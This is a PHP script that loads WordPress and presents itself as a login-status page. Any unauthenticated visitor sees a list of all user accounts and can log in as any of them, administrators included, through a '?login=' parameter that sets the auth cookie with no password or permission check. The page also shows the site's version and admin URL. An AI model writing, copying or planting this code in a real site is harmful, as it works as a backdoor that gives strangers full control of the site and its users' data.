<?php
// 加载 WordPress 环境
require_once(dirname(dirname(__FILE__)) . '/wp-load.php');

// 设置头部
header('Content-Type: text/html; charset=utf-8');

// 查看当前登录状态
echo '<h1>WordPress 登录状态</h1>';

if (is_user_logged_in()) {
    $current_user = wp_get_current_user();
    echo '<div style="background:#dfd;padding:10px;border:1px solid #6c6;margin:10px 0;">';
    echo '<p>已登录为: <strong>' . esc_html($current_user->user_login) . '</strong> (ID: ' . $current_user->ID . ')</p>';
    echo '<p>显示名称: ' . esc_html($current_user->display_name) . '</p>';
    echo '<p>角色: ' . implode(', ', $current_user->roles) . '</p>';
    echo '<p><a href="' . admin_url() . '" target="_blank">进入管理后台</a></p>';
    echo '<p><a href="?logout=1">退出登录</a></p>';
    echo '</div>';
} else {
    echo '<div style="background:#fdd;padding:10px;border:1px solid #c66;margin:10px 0;">';
    echo '<p>当前未登录</p>';
    echo '</div>';
    
    // 获取所有用户
    $users = get_users(array('fields' => array('ID', 'user_login', 'display_name')));
    
    echo '<h3>系统中可用的用户:</h3>';
    echo '<div style="display:flex;flex-wrap:wrap;gap:10px;">';
    foreach ($users as $user) {
        echo '<a href="?login=' . esc_attr($user->user_login) . '" style="display:inline-block;padding:8px 16px;background:#337ab7;color:white;text-decoration:none;border-radius:4px;">' . 
            esc_html($user->user_login) . ' (' . esc_html($user->display_name) . ')</a>';
    }
    echo '</div>';
}

// 处理退出登录
if (isset($_GET['logout']) && $_GET['logout'] == '1') {
    wp_logout();
    echo '<script>window.location.href = window.location.pathname;</script>';
    exit;
}

// 处理登录
if (isset($_GET['login']) && !empty($_GET['login'])) {
    $username = sanitize_user($_GET['login']);
    $user = get_user_by('login', $username);
    
    if ($user) {
        // 设置认证 cookie
        wp_set_auth_cookie($user->ID, true);
        echo '<div style="background:#dfd;padding:10px;border:1px solid #6c6;margin:10px 0;">';
        echo '<p>已成功登录为: <strong>' . esc_html($user->user_login) . '</strong></p>';
        echo '</div>';
        echo '<script>window.location.href = window.location.pathname;</script>';
        exit;
    } else {
        echo '<div style="background:#fdd;padding:10px;border:1px solid #c66;margin:10px 0;">';
        echo '<p>用户 <strong>' . esc_html($username) . '</strong> 不存在</p>';
        echo '</div>';
    }
}

// 添加站点信息
echo '<hr>';
echo '<div style="margin-top:20px;font-size:12px;color:#666;">';
echo '<p>WordPress 版本: ' . get_bloginfo('version') . '</p>';
echo '<p>站点名称: ' . get_bloginfo('name') . '</p>';
echo '<p>站点 URL: ' . get_bloginfo('url') . '</p>';
echo '<p>管理员 URL: ' . admin_url() . '</p>';
echo '<p>当前时间: ' . date('Y-m-d H:i:s') . '</p>';
echo '</div>'; 